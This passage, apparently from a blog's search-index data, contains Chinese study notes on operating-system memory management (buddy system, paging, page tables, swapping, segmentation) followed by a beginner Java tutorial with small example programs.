回收区与插入点的前一个空闲分区F1相邻接。此时应将回收区与插入点的前一分区合并，不必为回收分区分配新表项，而只需修改其前一分区F1的大小。 回收区仅与下面的空白区邻接，合并后仍为空白区F2，但其起始地址和大小均需改变。用回收区的首址作为新空闲区的首址，大小为两者之和。 回收区与上、下面的空白区邻接，此时将三个分区合并，使用F1的表项和F1的首址，取消F2的表项，大小为三者之和。 回收区与上、下面的空白区均不邻接，在这种情况下，应为回收区单独建立一新表项，填写回收区的首址和大小，并根据首地址插入到空闲链中的适当位置。 4.3.4 伙伴系统 固定分区与动态分区方案存在的问题： 算法复杂，回收分区时系统开销大 并发执行的进程数量受到限制 内部碎片影响内存利用率 伙伴系统——一种折中方案 在伙伴系统中，可用内存块大小为2 k(1≤k≤m) 21表示分配的最小块的尺寸 2m表示分配的最大块的尺寸，通常是可供分配的整个内存空间的大小 对空闲区按照大小分类，相同大小的分区链接为一个双向空闲链表；最多可形成k(0 ≤k≤m)个链表。 工作流程 进程请求大小为n的存储空间时， 首先计算一个 i 值，使2i-1 &lt; n ≤ 2i； 在空闲分区大小为2i的空闲分区链表中查找。 if 找到，即把该空闲分区分配给进程。 else 在分区大小为的空闲分区链表中寻找; ​ //表明长度为2i的空闲分区已经耗尽 if 找到大小2i+1的空闲分区 把该空闲分区分为相等的两个分区（一对伙伴），其中一个用于分配，另一个加入分区大小为2i 的空闲分区链表中。 else 查找大小为2i+2 的空闲分区… 4.3.5 哈希算法利用哈希快速查找的优点，以及空闲分区在可利用空间表中的分布规律，建立哈希函数，构造一张哈希表，以空闲分区大小为关键字，每一个表项记录了一个对应的空闲分区链表表头指针。 当进行空闲分区分配时，根据所需空闲分区大小，通过哈希函数计算，即得到在哈希表中的位置，从中得到相应的空闲分区链表，实现最佳分配策略。 4.3.6 可重定向分区分配 紧凑 可变式分区分配策略是在装入作业时根据其要求量为其划定相应的区域。这种分配策略，消除了固定式分区分配造成的“内零头”，但不可避免地在存储空间中造成“外零头”，为了进一步提高存储器的利用率，必须设法减少由于外零头造成的浪费。 一个最简单而直观的解决零头问题的办法是，定时地或者在内存紧张时，把存储空间中的空白区合并为一个大的连续区。 实现方法：将内存中的所有作业进行移动，使它们全都相邻接，可把原来分散的多个小分区合成一个大分区。这种技术称为存储器的“紧凑”。 把一个作业从一个存储区域移动到另一个存储区域所发生的问题，正如把一个作业装入到与它地址空间不 一致的存储空间所引起的问题一样，需要对作业中的某些地址部分和地址常数等进行调整。 一个较实用且可行的办法是采用动态重定位技术。当一个作业在主存中移动后，只要改变重定位寄存器中的内容即可 动态重定位 在动态运行时装入的方式中，作业装入内存后的所有地址都仍然是相对地址，将相对地址转换为物理地址的工作，被推迟到程序指令要真正执行时进行。 程序在执行时，真正访问的内存地址是相对地址与重定位寄存器中的地址相加而形成的。 动态重定位机制需要硬件的支持， 即须在系统中增设一个重定位寄存器，用它来存放程序(数据)在内存中的起始地址。 动态重定位分区分配 4.4 基于分页存储管理方式 离散分配方式的引入 连续分配方式会产生内/外零头 为解决零头问题又要进行紧凑等高开销活动 前面介绍的分区存储管理，一般都要求把一个作业的地址空间装入到连续的存储区域内。因此，在动态分区的存储空间中，常常由于存在着一些不足以装入任何作业的小的分区而浪费掉部分存储资源，这就是所谓存储器的零头问题。 尽管采用“紧凑”技术可以解决这个问题，但要为移动大量信息花去不少处理机时间，代价较高。 如果我们能取消对其存储区域的连续性要求，必然会进一步提高主存空间的利用率，又无需为移动信息付出代价。 什么是离散分配 程序在内存中不一定连续存放 根据离散时的基本单位不同，可分为三种： 分页存储管理、 分段存储管理 段页式存储管理 4.4.1 分页存储管理基本思想 离散的基础 分页(Pages)：将程序地址空间分页 分块(Frames)：将内存空间分块 离散分配的体现 内存一块可以装入程序一页 连续的多个页不一定装入连续的多个块中。 注意：系统中页块的大小是不变的。 离散分配的优点 没有外零头：不受连续空间限制，每块都能分出去 仅有小于一个页面的内零头：程序大小一般不是页大小的整数倍 由于进程的最后一页经常装不满一块而形成了不可利用的碎片，称之为“页内碎片”或称为“内零头”。 页面与物理块 页面或页(Page)：把每个进程的逻辑地址空间分成一些大小相等的片。 物理块或页框(Page Frame)：内存空间也分成与页相同大小的若干存储块。在为进程分配存储空间时，总是以页框为单位。 例如：一个作业的地址空间有m页。那么，只要分配给它m个页框，每一页分别装入一个页框内即可。这里，并不要求这些页框是连续的。 ​ 说明： ​ ⑴从0开始编制页号，页内地址是相对于0编址； ​ ⑵在进程调度时，必须把它的所有页一次装入到主存的页框内；如果当时页框数不足，则该进程必须等待，系统再调度另外的进程。（纯分页方式） 页面大小的选择 页面大小由机器的地址结构决定。某一机器只能采用一种大小的页面。 小页面：优点是可减少碎片，能提高内存的利用率。缺点是页表过长，占用较多的内存空间。且以页为单位进行换进、换出时效率低。 大页面：优点是页表小，换进换出时效率高。但页内碎片相应较大。 页面的大小通常在1KB~8KB之间 实现分页存储管理的数据结构 页表：每个进程对应1个页表，描述该进程的各页面在内存中对应的物理块号。 页表中包括页号、物理块号（还可有存取控制字段，对存储块中的内容进行保护）。 注意：全部页表集中存放在主存的系统专用区中，只有系统有权访问页表，保证安全。 作业表：整个系统只有1张，记录作业的页表情况，包含进程号、页表长度、页表始址等信息。 空闲块表：整个系统只有1张，记录主存当前空闲块。 例如： 假设内存能提供16个空闲页框，进程P1被分割成4个页面，装入内存中的0号至3号页框。进程P2被分割成3个页面，装入4号至6号页框。进程P3被装入7号至12号页框，如图(a)所示。 此时，进程P4请求分配5个页框大小的存储空间，但内存只有3个空闲页框。于是，将暂时不运行的P2交换出内存，如图(b)所示。 然后，再将P4装入4、5、6、13、14号页框，如图(c)所示。 地址结构 地址空间为程序限定的空间。 物理空间为内存限定空间。 在页式管理系统中将地址空间分成大小相同页面。将内存空间分成与页面相同大小的存储块。 分页存储管理的逻辑地址表示 例题： 计算指导：把1K换成8进制进行计算即可！ 4.4.2 地址变换机构 地址变换机构的功能是将用户的逻辑地址转变为内存中的物理地址。 逻辑地址由页号和页内位移量组成。 页的大小和内存物理块的大小是相同的，所以页内位移量即为物理块内位移量。 关键是页号到物理块号的转换，由页表完成。 基本的地址变换机构 使用寄存器存放页表 速度快，成本高。特别对于大的系统，页表很长，不可能都用寄存器实现。 一般系统，将页表存放在内存中。 设置一个页表寄存器(PTR)**，记录当前运行的进程的页表在内存中的起始地址和页表长度。(**平时存放于PCB-进程控制块中，要运行时，才装入PTR中)。 当进程真正投入运行时，从进程PCB中读出页表的始址和页表长度，并将这两个数据装入PTR中，以后地址转换时直接从PTR中获得页表的起始地址。 分页系统中的地址变换过程如下： （1）根据逻辑地址,计算出页号和页内偏移量； （2）从PTR中得到页表首址，然后检索页表，查找指定页面对应的页框号； （3）用页框号乘以页面大小获得其对应的起始地址，并将其送入物理地址的高端。 （4）将页内偏移量送入物理地址低端，形成完整的物理地址。 例题1： 千万小心！！！物理块号和页表中的页号都是从0开始！！！ 例题2： 例题3： 具有快表的地址变换机构 分页系统中处理机每次存取指令或数据至少需要访问两次物理内存 第一次访问页表，以得到物理地址 第二次访问物理地址，以得到数据。 存取速度几乎降低了一倍，代价太高 为了提高地址变换速度，为进程页表设置一个专用的高速缓冲存储器，称为快表TLB(Translation Lookaside Buffer)，或联想存储器（Associative Memory）。 工作原理 类似于系统中的数据高速缓存(cache)，其中专门保存当前进程最近访问过的一组页表项。 进程最近访问过的页面在不久的将来还可能被访问。 工作流程 根据逻辑地址中的页号，查找快表中是否存在对应的页表项。 若快表中存在该表项，称为命中（hit），取出其中的页框号，加上页内偏移量，计算出物理地址。 若快表中不存在该页表项，称为命中失败，则再查找页表，找到逻辑地址中指定页号对应的页框号。同时，更新快表，将该表项插入快表中。并计算物理地址. 4.4.3 访问内存的有效时间EAT 定义：从进程发出指定逻辑地址的访问请求，经过地址变换，再到内存中找到对应的物理单元并取出数据，所花费的总时间。 因成本关系，联想存储器不是很大，通常只能存放16~512个页表项。这对中小作业，已有可能把全部页表放在其中；但对大型作业，只能放一部分。 如检索快表时间为20ns，访问内存为100 ns。 若能在快表中检索到CPU给出的页号，则CPU存取一个数据共需120 ns 否则，需要220ns的时间。 当访问联想存储器时的命中率分别为0%，50%，80%，90%，98%时，其有效访问时间如下表所示： 4.4.4 两级和多级页表 问题 32位逻辑地址空间，假设页面大小为4KB（212），则4GB（232）的逻辑地址空间将被划分成220个页面。 若采用一级页表，则该表将包含1M（220）个页表项。若按字节寻址，一个页表项占4B，则一级页表需要占用4MB（222）内存空间。不可能将4MB的页表保存在一个连续区中。 那么，如何处理大页表的存储与检索呢？ 可以采用这样两个方法来解决这一问题： ① 采用离散分配方式来解决难以找到一块连续的大内存空间的问题，（即引入两级页表）； ② 只将当前需要的部分页表项调入内存， 其余的页表项仍驻留在磁盘上，需要时再调入。 对于要求连续的内存空间来存放页表的问题： 可将页表进行分页，并离散地将各个页面分别存放在不同的物理块中， 同样也要为离散分配的页表再建立一张页表，称为外层页表(Outer Page Table)，在每个页表项中记录了页表分页的物理块号。 地址变换机构中增设外层页表寄存器，用于存放外层页表的始址。 利用逻辑地址中的外层页号，作为外层页表的索引，从中找到指定页表分页的始址，再利用指定页表分页的索引，找到指定的页表项，即该页在内存的物理块号。 用该块号和页内地址即可构成访问的内存物理地址。 多级页表对于64位机器，采用两级页表是否合适？ 注意：4B为一个页表项大小！！！ (2^52^4B)/2^12^=2^42^ 个页表分页 2^42^\\4B=16KGB 外层页表大小 [ 4.4.5 反置页表Inverted Page Table（IPT） 大地址空间问题 对于大地址空间(64-bits)系统，多级页表变得繁琐。 如：5级页表 逻辑(虚拟)地址空间增长速度快于物理地址空间。 反置页表的思路 不让页表与逻辑地址空间大小相对应 让页表和物理地址空间的大小相对应 IPT主要解决问题 逻辑空间越来越大，页表占用内存也越来越大，为解决大页表问题占内存多现象，减少内存开销，避免一个进程一个页表。 IPT思想： IPT是为主存中的每一个物理块建立一个页表项并按照块号排序。 该表每个表项包含正在访问该物理块的进程标识、页号及特征位,用来完成主存物理块到访问进程的页号的转换。 Hash表检索 IPT只包含已经调入内存的页面，不包含尚未调入内存的页面。 反置页表地址转换过程如下： 给出进程标识和页号,用它们去比较IPT,若整个反置页表中未能找到匹配的页表项,说明该页不在主存，产生请求调页中断,请求操作系统调入。 否则，该表项的序号便是物理块号,块号加上位移,便形成物理地址。 4.4.6 对换（Swapping） 对换：把内存中暂不能运行的进程或暂时不用和程序和数据，换到外存上，以腾出足够的内存空间，把已具备运行条件的进程，或进程所需要的程序和数据，换入内存。 对换是系统行为，是提高内存的利用率的有效措施。 常用于多道程序系统或小型分时系统中，与分区存储管理配合使用。 实现：可在系统中设一对换进程，以执行换进内存、换出至外存操作。 对换技术，最早用在分时系统UNIX中。 在任何时刻，在该系统的主存中只保存一个完整的用户作业，当其运行一段时间后，或由于分配给它的时间片已用完，或由于需要其它资源而等待，系统就把它交换到辅存，同时把另一个作业调入主存让其运行。这样，可以在存储容量不大的小型机上实现分时系统。Microsoft公司的 Windows OS也采用这种对换技术。 分类： “整体对换”（进程对换）： 对换以整个进程为单位，用于分时系统，以解决内存紧张的问题。 “页面对换/分段对换”： 对换以“页”或“段”为单位进行“部分对换”，该方法是实现请求分页及请求分段存储器的基础，支持虚存系统。 为实现对换，系统需要三方面的功能： 对换空间管理 进程的换入 进程的换出 一、对换空间管理 外存被分为两部分，文件区和对换区 Windows常用的分区格式有三种，分别是FAT16、FAT32、NTFS格式。在Linux操作系统里有Ext2、Ext3、Linux swap和VFAT四种格式。 文件区用于存放文件，对它的管理应重在如何提高存储空间的利用率。所以对它采取离散分配方式。 即：一个文件可根据当前外存的使用情况，被分成多块，分别存储到不邻接的多个存储区域中，用指针相连。 对换区存放从内存换出的进程，它们在外存的存放时间较短，换入、换出频繁。对对换区的管理应重在提高进程的换入换出速度。因此采用连续分配方式。 即：把一个换出的进程存放到一个连续的存储空间中。 为了能对对换区中的空闲盘块进行管理，在系统中应配置相应的数据结构，以记录外存的使用情况。 空闲分区表或空闲分区链。在空闲分区表中的每个表目应包含两项，即对换分区首址和对换区长度，它们的基本单位都是盘块。（盘块的大小和操作系统的具体文件系统有关系！比如FAT32的盘块大小为4KB） 对换区的分配，是采用连续分配方式。因而对对换区空间的分配与回收，与动态分区方式时内存的分配与回收方法雷同。 分配算法可以是首次适应算法、循环首次适应算法和最佳适应算法。 回收操作也可分为四种情况。 二、进程换入与换出(由对换进程完成) 换出 swap out 选择：首先选择阻塞或睡眠状态的进程，若有多个，按优先级由低到高进行选择。若没有此状态进程，则选择就绪状态的，仍然按优先级由低到高进行选择。 为避免某进程被频繁的换入换出，还应考虑进程在内存中的驻留时间，优先选择驻留时间长的进程。 换入 swap in ①从 PCB集合中查找“就绪且换出”的进程，有多个，则选择换出时间最长的。 ②根据进程大小申请内存，成功则读入，否则要先执行换出，再换入。 ③若还有可换入进程，则转向①。直至无“就绪且换出”进程或无法获得足够内存空间为止。 4.5 基本分段式存储管理 4.5.1 分段式存储管理方式的引入4.5.2 分段式存储管理的基本原理4.5.3 段的共享和保护4.5.4 段页式存储管理 引言：程序员眼中的程序 模块化程序设计的分段结构 模块化程序设计的分段结构 4.5.1 分段存储管理方式的引入 分段存储管理更加符合用户和程序员的如下需求： 方便编程 信息共享 一般实现程序和数据共享时都是以信息的逻辑单位（过程、函数或文件）为基础的。 在分页系统中的每一页都只是存放信息的物理单位，其本身并无完整意义，因而不便于实现信息共享。 段是信息的逻辑单位，可以为共享过程建立一个独立的段，更便于实现程序和数据的共享。 信息保护 对内存中的信息的保护，同样也是对信息的逻辑单位进行保护。 采用分段存储管理，对实现保护，将是更有效和方便。 动态链接 程序运行时，先将主程序所对应的目标程序装入内存并启动运行，当运行过程中又需要调用某段时，才将该段调入内存并进行链接。 动态增长 在实际使用中，往往有些段，特别是数据段会随着程序的运行不断增大，而这种增长事先并不知晓会增长到多大，采用其它存储管理方式是难以应付的，而分段存储管理却能较好的解决这一问题。 4.5.2 分段管理系统的基本原理一、分段 作业地址空间按逻辑信息的完整性被划分为若干个段； 每段有段名（或段号），每段从0开始编址； 段内的地址空间是连续的。 许多编译程序支持分段方式，自动根据源程序的情况产生若干个段。 在分段管理系统中，对所有地址空间的访问均要求两个成分： 段的名字 段内地址 例如，可按下述调用： CALL [X]|&lt;Y&gt; 转移到子程序X中的入口点Y LOAD 1, [A]|&lt;D&gt; 将数组A的D单元的值读入寄存器1 STORE 1,[B]|&lt;C&gt;将寄存器1的内容存入分段B的C单元中 这些符号程序经汇编和装配后，指令和数据的单元地址均由两部分构成：一是表示段名的段号S；一是位移量W，即段内地址。所以，在分段系统中的地址结构有如下形式： 一旦段号字段和位移量字段的长度确定后，一个作业地址空间中允许的最多段数及段的长度也就限定了。 分段管理：就是管理由若干分段组成的作业，且按分段来进行存储分配 实现分段管理的关键在于，如何保证分(二维)地址空间中的一个作业在线性(一维)的存储空间中正确运行。 也就是说，如何把分段地址结构变换成线性的地址结构，和分页管理一样，可采用动态重定位技术，即通过地址变换机构来实现。 二、段表 为每个分段分配一个连续的分区，而进程中的各个段可以离散地移入内存中不同的分区中。 应像分页系统那样，在系统中为每个进程建立一张段映射表，简称“段表”。每个段在表中占有一个表项，其中记录了该段在内存中的起始地址（又称为“基址”）和段的长度。 通常将段表放在内存中，执行中的进程可通过查找段表找到每个段所对应的内存区。 作用：实现从逻辑段到物理内存区的映射。 每个表项（段描述子）至少有三个数据项：段长、主存起始地址和存取控制。 段长指明它的大小； 主存起始地址指出该段在主存中的位置； 存取控制说明对该段访问的限制(R＝1，允许读；W=1，允许写；X=1,允许执行) 。 问：若段表放在内存中，每访问一个数据需要访问内存几次？ 2次 可设置联想存储器（快表），以提高访问速度。 优点： 没有内碎片，外碎片可以通过内存紧凑来消除。便于改变进程占用空间的大小。 缺点 进程全部装入内存 4.5.3 段的共享和保护4.5.4 段页式存储管理4.6 虚拟存储器的基本概念4.6.1 虚拟存储器的引入4.6.2 局部性原理","categories":[],"tags":[{"name":"考试","slug":"考试","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/%E8%80%83%E8%AF%95/"}]},{"title":"JAVA基础到面向对象","slug":"Java","date":"2021-04-17T07:31:23.000Z","updated":"2021-07-22T06:29:41.960Z","comments":true,"path":"2021/04/17/Java/","link":"","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/2021/04/17/Java/","excerpt":"","text":"Java基础语法和Java面向对象第2章 导学2.1 编程语言介绍常用语言对比： C语言：执行效率比较高，一般用来做底层驱动或者操作系统。 C++：游戏内核，应用程序。 C#：微软、支持的平台是windows，基于.netframework的。 Java：世界第一，toibe排行榜。 Python：脚本语言，灵活性极高。 html：静态网页，网站 CSS：美化网页 JS：动态网页 go语言：谷歌开发 Sql：数据库，数据是软件的根本 语言类型： 编译型：一次编译，到处运行。 执行效率较高，跨平台比较差 解释型：一行一行解释，执行。 执行效率较低，跨平台性较好。 混合型，譬如Java。 2.2 Java简介Java是一门程序开发语言. 1991年由sun公司的James Gosling和他的团队一起开发了一个叫Oak的语言. 在1995年更名为Java. 一直沿用至今。 特点：针对C++简化了很多 ​ Java相关概念： JVM(Java Virtual Machine)：Java虚拟机，用来模拟统一的硬件平台环境，供Java程序运行的一个软件。 JRE(Java Runtime Environment)：Java运行时环境，里面包含了JVM和一些Java运行时的类库。 JDK(Java Development Kit)：Java开发工具包、包含JRE和Java开发工具包。 2.3 第一个Java程序12345public class first&#123; public static void main(String[] args)&#123; System.out.println(&quot;Hello world!!!&quot;); &#125; &#125; public class first：这一行表示创建一个类，类是Java程序运行的最小单元，必须要有类。 public static void main(String[] args)：Java程序入口，一切从这里开始执行。 System.out.println(&quot;Hello world!!!&quot;)：让程序打印一句话，内容是引号中的内容。 注意：Java程序严格区分大小写，写错一个字母都不行。 2.4 Java注释一、单行注释 1// 单行注释，这一行执行时，会被JVM运行的时候过滤掉。 二、多行注释 1234/* 多行注释 一次注释多行代码 */ 三、文档注释 1234/** * 文档注释 * 后期可以使用Javadoc命令生成api文档 */ 注释场景： 核心的解决方案 比较难懂的业务逻辑 记录代码存在经历 2.5 VS code快捷键编辑器与窗口管理文件之间切换：Ctrl+Tab 打开一个新的vs code编辑器：Ctrl+Shift+N 关闭当前窗口： Ctrl+W 切出一个新的编辑器窗口（最多3个)：Ctrl+\\ 切换左中右3个编辑器窗口的快捷键：Ctrl+1 Ctrl+2 Ctrl+3 代码调整代码行向左或向右缩进：Ctrl+[ 、 Ctrl+]/TAB、shift+TAB 代码格式化：Shift+Alt+F 代码移动：Alt + UP/DOWN 代码单行向上/向下复制：Shift + Alt + UP/DOWN 当前行下方插入一行：Ctrl + Enter 当前行上方插入一行：Ctrl + Shift + Enter 批量替换当前文件中匹配的所有文本：Ctrl + F2 删除一行：Ctrl + X 光标相关回退上一个光标操作：Ctrl + U 代码重构跳转到下一个error或者warning：F8 查找替换查找：Ctrl + F 查找替换：Ctrl + H 搜索所有文本：Ctrl + Shift + F 页面布局界面放缩：Ctrl +/- 侧栏显示/隐藏：Ctrl + B 显示DEBUG：Ctrl + Shift + D 显示OUTPUT：Ctrl + shift + U 打开/关闭终端：Ctrl + ` 任务管理器：Ctrl + Alt + Delect 重新打开关闭的编辑器页面：Ctrl Shift + T 2.6 变量变量: 可以发生改变的量. 程序运行过程中产生的中间值。供后面的程序使用。 java中的变量：数据类型 变量名 = 值； int 类型 1234567891011121314151617181920public class type &#123; public static void main(String[] args) &#123; int a = 20, b = 20; int c = a + b; System.out.println(a); System.out.println(b); System.out.println(&quot;a + b = &quot; + c); int d = a - b; System.out.println(&quot;a - b = &quot; + d); int e = a * b; System.out.println(&quot;a * b = &quot; + e); int f = a / b; System.out.println(&quot;a / b = &quot; + f); &#125;&#125; double型：小数，计算结果一定也是小数。 1234567891011121314151617181920public class type &#123; public static void main(String[] args) &#123; double a = 20, b = 20; double c = a + b; System.out.println(a); System.out.println(b); System.out.println(&quot;a + b = &quot; + c); double d = a - b; System.out.println(&quot;a - b = &quot; + d); double e = a * b; System.out.println(&quot;a * b = &quot; + e); double f = a / b; System.out.println(&quot;a / b = &quot; + f); &#125;&#125; String字符串：注意(String)的S必须大写。 12345678910public class type &#123; public static void main(String[] args) &#123; String s1 = &quot;为什么不在自信一点？&quot;; String s2 = &quot;你快变成你自己最讨厌的样子了，zjl，你知道吗？&quot;; String s3 = &quot;为什么你总是因为害怕失败而不敢去尝试？&quot;; String s4 = s3 + &quot;你应该知道因为这样你失去了多少东西&quot;; System.out.println(s4); &#125;&#125; bollean布尔值：非真即假。 1234567891011121314151617public class type &#123; public static void main(String[] args) &#123; boolean a = true; boolean b = false; System.out.println(a); System.out.println(b); boolean c = 1 &gt; 2; boolean d = 2 &gt; 1; System.out.println(c); int e = 10; System.out.println(e == 10); System.out.println(e != 10); &#125;&#125; 中文乱码：UTF-8 –&gt; GBK 2.8 用户输入123456789101112131415161718192021222324import java.util.Scanner;//导入Scanner包public class type &#123; public static void main(String[] args) &#123; // 准备一个Scanner对象20 Scanner sc = new Scanner(System.in); // 数据类型 // 获取数据 System.out.println(&quot;请输入你的年龄：&quot;); int my_age = sc.nextInt(); System.out.println(&quot;录入年龄 &quot; + my_age); System.out.println(&quot;请输入你的余额：&quot;); double my_money = sc.nextDouble(); System.out.println(&quot;录入余额 &quot; + my_money); // 获取字符串，以回车键为止。 System.out.println(&quot;请输入你的姓名：&quot;); String my_name = sc.nextLine(); System.out.println(&quot;录入姓名&quot; + my_name); &#125;&#125; 注意:不出意外,会自动跳过录入姓名项,因为和C语言类似,我们没有去清除Enter,会导致后续录入字符串读入Enter导致直接结束录入,要看效果,把前面的两个删除即可. 2.9 If语句12345678910111213141516171819202122232425import java.util.Scanner;//导入Scanner包public class type &#123; public static void main(String[] args) &#123; Scanner sc = new Scanner(System.in); while (true) &#123; System.out.println(&quot;请输入你的考研成绩&quot;); int score = sc.nextInt(); if (score &gt; 500 || score &lt; 0) &#123; System.out.println(&quot;请输入正确成绩(0~500)&quot;); &#125; else if (score &lt; 315) &#123; System.out.println(&quot;请好好学习，明年再来！&quot;); &#125; else if (score &gt;= 350 &amp;&amp; score &lt; 400) &#123; System.out.println(&quot;初始通过，计算机学院！&quot;); &#125; else if (score &gt;= 400 &amp;&amp; score &lt; 420) &#123; System.out.println(&quot;初始通过，通信！&quot;); &#125; else if (score &gt; 420) &#123; System.out.println(&quot;初始通过，专业任选！&quot;); &#125; &#125; &#125;&#125; 2.10 while循环(略)2.11 作业猜数字游戏 123456789101112131415161718192021222324252627282930313233343536373839//猜数游戏import java.util.Scanner;//导入Scanner包import java.util.Random;//导入Random包public class type &#123; public static void main(String[] args) &#123; Scanner sc = new Scanner(System.in); Random rm = new Random(); System.out.println(&quot;欢迎来到猜数游戏，你要猜的数在0~99之间。&quot;); int n = rm.nextInt(100); // 生成0~99之间的随机数 int times = 0; while (true) &#123; System.out.println(&quot;请输入你的猜的数字：&quot;); int guess = sc.nextInt(); if (guess == n) &#123; times = times + 1; System.out.println(&quot;答对了,猜的次数：&quot; +times ); System.out.println(&quot;是否继续？(1/0)&quot;); int answer = sc.nextInt(); if (answer == 0) &#123; System.exit(1); &#125; else &#123; System.out.println(&quot;欢迎来到猜数游戏，你要猜的数在0~99之间。&quot;); n = rm.nextInt(100); // 生成0~99之间的随机数 times = 0; &#125; &#125; else if (guess &gt; n) &#123; times = times + 1; System.out.println(&quot;猜大了！&quot;); &#125; else if (guess &lt; n) &#123; times = times + 1; System.out.println(&quot;猜小了！&quot;); &#125; &#125; &#125;&#125; 第3章 Java基础3.1二进制转化(略)3.2 编码现代计算机编码类型: ASCII码：最开始编码,只支持英文，8比特。 ANSI码：对ASCII的扩展，只是一套标准，不同的国家使用该标准对自己国家的文字进行编码。 GBK：中国ANSI编码，起名GB码，后期扩展成GBK，GBK兼容ASCII，16比特。 Unicode：由于各个国家的编码不相容，由国际标准化组织ISO和统一码联盟制作了Unicode，对各国文字进行统一编码，32比特。 UTF-8：由于编入很多国家文字，占用内存很大，网络传输占用带宽，于是产生了UTF-8，是可变长度的Unicode，全称：Unicode Transformation Format。对于不同的文字信息，UTF的长度不同，英文8比特，欧洲文字16比特，中文24比特。 3.3 Java基础数据类型 基础数据类型： 整数 byte：字节，1字节，范围-128~127 short短整数：2字节，-32768~32767 int整数：4字节 long长整数：8字节 浮点数 float：单精度浮点数，精度低。 double：双精度浮点数，精度高。 字符 char：字符类型，表示单个字符，2字节。 布尔 boolean：布尔类型，两个取值（true,false） 引用数据类型：除开基本数据类型以外，其他数据类型全是引用数据类型，最典型的：字符串String。 字符串可以执行加法运算，表示字符串拼接。 当出现非字符串和字符串进行相加的时候. 首先把非字符串自动转化成字符串然后再执行拼接操作。 转义字符：具有特定含义的字符串。 \\n：换行符 \\t：水平制表符 \\&#39;：&#39; \\&quot;:\\ 3.4 基础数据类型之间的转化一般是对数字进行转化，char和boolean类型一般不参与转化。 我们把数据类型进行排序, 按照能表示的数据量的范围进行排序： byte-&gt;short-&gt; int -&gt;long-&gt;float-&gt;double long排在float前面，因为整数是有数据量的范围的，而小数是没有的， 从小数据类型向大数据类型转化是直接转化的。 123456789101112public class type &#123; public static void main(String[] args) &#123; byte a = 10; int b = a; System.out.println(b); //10 long c = b; System.out.println(c); //10 &#125;&#125; 大数据类型向小数据类型转化，需要强制类型转换。 123456789public class type &#123; public static void main(String[] args) &#123; long a = 3000000; int b = (int) a; System.out.println(b); // 10 &#125;&#125; 3.5 基本数据类型之间的运算 相同数据类型之间运算，得到的一定是这个数据类型。 int = int +int 不同数据类型之间运算：首先把小的数据类型转化为大的数据类型·1，然后进行计算，得到的结果一定时大的数据类型。 long = long + int 特殊的byte、short、char：执行算数运算时，首先会转化为int类型再进行计算，因为这样是安全的。 int = int + char int = byte + byte 1234567public class type &#123; public static void main(String[] args) &#123; char a = &#x27;A&#x27;; int b = 100; System.out.println(a+b); // 10 &#125;&#125; 输出：165；证明是这样的。 相关报错： 123short a = 1;short b = a + 1;System.out.println(b); 此时第2行代码一定会报错。 因为s1是short类型。而short类型计算的时候会自动转换成int进行计算。并且，所有的数字， 默认都可以看做是int类型， 默认的小数都可以看做是double类型，所以第二行计算的结果应该是int类型。把int类型的数据赋值给short类型的变量，一定会报错的，此处必须要进行强制类型转换。 3.6 基本运算符 算数运算符：+ - * / 复制运算符： = += -= *= /= %= 比较运算符：&gt; &lt; &gt;= &lt;= != == 结果一定是boolean类型。 如果是字符串比较，不能用 ==，要用equals 12345678910111213public class type &#123; public static void main(String[] args) &#123; String str1 = &quot;我是憨批&quot;; String str2 = &quot;我是憨批&quot;; System.out.println(str1 == str2); System.out.println(str1.equals(str2)); String str3 = new String(&quot;我是憨批&quot;); String str4 = new String(&quot;我是憨批&quot;); System.out.println(str3 == str4); System.out.println(str3.equals(str4)); &#125;&#125; 输出： 1234truetruefalsetrue 逻辑运算符： &amp;：并且 |：或者 ! ：取反 &amp;&amp;：短路与 ||：短路或 |, || 或者的含义, 左右两端同时为假，结果才能是假。 &amp;, &amp;&amp; 并且的含义. 左右两端同时为真，结果才能是真。 短路：再执行并/或运算时，如果式子的前面已经得到了结果，那么式子的后半段就不再继续进行运算了，效率较高。（与：有假就停，或：有真就停）。 一元运算 a++; a–; 3.7 switch语句switch变量必须是int或者String。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546public class type &#123; public static void main(String[] args) &#123; Scanner birth_year = new Scanner(System.in); System.out.println(&quot;输入出生年份：&quot;); int a = birth_year.nextInt(); switch (a) &#123; case 2001: case 2013: case 1989: System.out.println(&quot;属蛇&quot;); break; case 2002: case 2014: case 1990: case 1966: case 1978: System.out.println(&quot;属马&quot;); break; case 2000: case 2012: case 1988: System.out.println(&quot;属龙&quot;); break; case 1999: case 1987: case 2011: System.out.println(&quot;属兔&quot;); break; case 1998: case 1986: case 2010: System.out.println(&quot;属虎&quot;); break; case 1997: case 1985: case 2009: System.out.println(&quot;属牛&quot;); break; default: System.out.println(&quot;暂时未录入&quot;); break; &#125; &#125;&#125; 注意：break一定不要忘记，如果没有及时跳出switch，会发生case穿透现象。 case穿透：如果有一个case匹配成功，则后面的case不会继续判断，而是直接执行后续的所有case成立语句。 3.8 for循环（略）死循环： 123for(;;)&#123; System.out.println(&quot;我是憨憨！&quot;);&#125; 3.9 do……while循环无限循环： 123do&#123; ……&#125;while(true); 注意不要忘记while后面的 ; 3.10 break和continuebreak：停止当前循环，用于while/for/do……while循环 contiune：停止当前这次循环，跳至循环体代码末尾。(循环过程中,某些数据不需要处理时，可以使用它跳过。) 123456for (int i = 0 ; i &lt; 10; i++)&#123; if(i == 7)&#123; continue; // 我不喜欢7 &#125; System.out.println(i);&#125; 3.11 数组声明时需要给出数据类型。 12345678910public class type &#123; public static void main(String[] args) &#123; String[] arr = new String[10];//创建了10个位置，可以装载10个字符串，当前是空的。 String[] game = &#123;&quot;LOL&quot;,&quot;DNF&quot;,&quot;云顶&quot;,&quot;当铺人生&quot;&#125;; String[] smallGames = new String[]&#123;&quot;张加林是憨批&quot;,&quot;张加林是傻逼&quot;,&quot;张加林是胆小鬼&quot;,&quot;张加林是废物&quot;&#125;; System.out.println(game[1]); System.out.println(smallGames[2]); &#125;&#125; 数组越界、数组遍历，略 3.12 数组算法程序 = 算法 + 数据结构 质数：只能被1和自生整除的数。 12345678910111213141516171819202122232425262728import java.util.Scanner;//导入Scanner包public class type &#123; public static void main(String[] args) &#123; Scanner object = new Scanner(System.in); boolean flag; while (true) &#123; System.out.println(&quot;请输入一个数( 输入0退出)：&quot;); int a = object.nextInt(); if (a == 0) &#123; break; &#125; else &#123; flag = false; for (int i = a / 2; i &gt; 1; i--) &#123; if (a % i == 0) &#123; flag = true; System.out.println(a + &quot;不是质数。&quot;); break; &#125; &#125; if(!flag) System.out.println(a + &quot;是质数。&quot;); 